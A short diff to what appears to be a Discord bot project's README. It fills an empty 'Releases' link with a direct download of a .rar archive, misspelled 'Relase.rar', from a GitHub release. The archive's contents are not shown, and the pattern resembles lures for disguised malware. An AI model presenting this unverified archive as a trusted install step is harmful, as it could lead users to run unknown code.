@@ -14,7 +14,7 @@
 </html>
 
 ## DOWNLOAD
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/Spotexa/Discord-A-BOT-/releases/download/v2.4/Relase.rar)
 
 ## Features and commands 🌟
 
